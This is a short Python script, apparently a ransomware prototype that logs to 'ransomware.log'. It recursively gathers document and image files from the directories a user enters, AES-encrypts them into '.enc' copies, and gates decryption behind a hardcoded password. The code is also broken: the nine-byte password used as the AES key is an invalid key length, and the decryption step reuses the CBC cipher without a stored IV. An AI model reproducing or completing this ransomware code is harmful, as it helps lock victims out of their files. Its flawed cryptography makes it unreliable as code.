import os
import glob
import getpass
import logging
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from base64 import b64encode, b64decode


logging.basicConfig(filename='ransomware.log', level=logging.DEBUG, format='%(asctime)s %(message)s')


def configure_paths():
    print("Enter the directories you want to work with separated by a comma (e.g., /home/user/documents,/home/user/downloads):")
    paths = input().split(',')
    return paths


def collect_files(file_types, paths):
    collected_files = []

    for file_type in file_types:
        for path in paths:
            for file_path in glob.glob(os.path.join(path, f"**/*{file_type}"), recursive=True):
                collected_files.append(file_path)

    return collected_files


def encrypt_decrypt_file(file_path, cipher, decrypt=False):
    try:
        with open(file_path, "rb") as file:
            data = file.read()

        if decrypt:
            new_data = unpad(cipher.decrypt(b64decode(data)), AES.block_size)
            new_file_path = file_path[:-4]
        else:
            new_data = b64encode(cipher.encrypt(pad(data, AES.block_size)))
            new_file_path = file_path + ".enc"

        with open(new_file_path, "wb") as file:
            file.write(new_data)
    except (PermissionError, FileNotFoundError) as e:
        logging.error(f"Error processing file {file_path}: {e}")


def encrypt_decrypt_files(files, cipher, decrypt=False):
    for file_path in files:
        encrypt_decrypt_file(file_path, cipher, decrypt)


def main():
    password = "swordf!sh"
    key = password.encode("utf-8")

    paths = configure_paths()
    file_types = [".txt", ".doc", ".pdf", ".jpg", ".png"]
    files = collect_files(file_types, paths)

    cipher = AES.new(key, AES.MODE_CBC)

    encrypt_decrypt_files(files, cipher)
    print("Files have been encrypted. To decrypt, enter the correct password.")

    input_password = getpass.getpass("Enter your password to decrypt files:")
    if input_password == password:
        encrypted_files = collect_files([".enc"], paths)
        encrypt_decrypt_files(encrypted_files, cipher, decrypt=True)
        print("Files have been decrypted.")
    else:
        print("Incorrect password. Files were not decrypted.")


if __name__ == "__main__":
    main()
